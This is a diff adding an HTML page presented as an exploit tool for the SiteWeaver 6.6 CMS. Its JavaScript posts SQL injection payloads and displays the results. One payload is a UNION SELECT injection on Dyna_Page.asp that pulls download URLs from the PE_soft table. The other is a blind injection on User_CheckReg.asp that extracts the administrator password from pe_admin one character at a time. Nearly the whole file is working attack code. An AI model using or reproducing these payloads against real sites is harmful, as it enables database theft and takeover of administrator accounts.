@@ -1,0 +1,61 @@
+<script>
+function gb2utf8(data){
+        var glbEncode = [];
+        gb2utf8_data = data;
+        execScript("gb2utf8_data = MidB(gb2utf8_data, 1)", "VBScript");
+        var t=escape(gb2utf8_data).replace(/%u/g,"").replace(/(.{2})(.{2})/g,"%$2%$1").replace(/%([A-Z].)%(.{2})/g,"@$1$2");
+        t=t.split("@");
+        var i=0,j=t.length,k;
+        while(++i<j) {
+               k=t[i].substring(0,4);
+               if(!glbEncode[k]) {
+                       gb2utf8_char = eval("0x"+k);
+                       execScript("gb2utf8_char = Chr(gb2utf8_char)", "VBScript");
+                       glbEncode[k]=escape(gb2utf8_char).substring(1,6);
+               }
+               t[i]=glbEncode[k]+t[i].substring(4);
+        }
+        gb2utf8_data = gb2utf8_char = null;
+        return unescape(t.join("%"));
+}
+
+function PostData(){
+	var url = document.getElementById("url").value; 
+	var post= document.getElementById("post").value;
+	var oXmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+	oXmlHttp.open("POST", url, false);
+	if (url.indexOf("User_CheckReg.asp")>0){oXmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");}
+	oXmlHttp.send(post);
+	var GetResult=gb2utf8(oXmlHttp.responseBody);
+	if (oXmlHttp.readyState == 4) {
+		if (oXmlHttp.status == 200) {
+     		document.getElementById("getResult").value = GetResult;
+    		}    
+   	}
+}
+function Inject(i){
+	if (i==1){
+	document.getElementById("url").value="http://127.0.0.1:81/pe2006/Dyna_Page.asp";
+	document.getElementById("post").value='<?xml version="1.0" encoding="gb2312"?><root><id>21</id><page>1</page><value>0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,DownloadUrl,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52 from PE_soft where softid=1|1</value></root>';
+	}
+	else
+	{
+	document.getElementById("url").value="http://127.0.0.1:81/pe2006/Reg/User_CheckReg.asp";
+	document.getElementById("post").value="UserName=admino'%20union%20select%201%20from%20pe_admin%20where%20username='admin'band%20Mid(password,1,1)>'0";
+	}
+}
+
+</script>
+<BODY>
+<div align="center">动易SiteWeaver6.6版最新漏洞利用工具</div> 
+请输入URL：<br>
+<INPUT TYPE="text" id="url" value="http://127.0.0.1:81/pe2006/Dyna_Page.asp" style="width:90%;">&nbsp;&nbsp;&nbsp;<br>
+输入Post：<br>
+<textArea id="post" style="width:90%; height:80;"><?xml version="1.0" encoding="gb2312"?>
+<root><id>21</id><page>1</page><value>0 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,DownloadUrl,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52 from PE_soft where softid=1|1</value></root></textArea>
+<div align="center"><INPUT TYPE="button" value="漏洞一示例" onClick="Inject(1);">&nbsp;&nbsp;<INPUT TYPE="button" value=" 提  交 " onClick="PostData();">&nbsp;&nbsp;<INPUT TYPE="button" value="漏洞二示例" onClick="Inject(2);"></div>
+<hr size=2 >
+注入结果：<br>
+<textArea id="getResult" style="width:90%; height:200;"></textArea>
+</BODY>
+
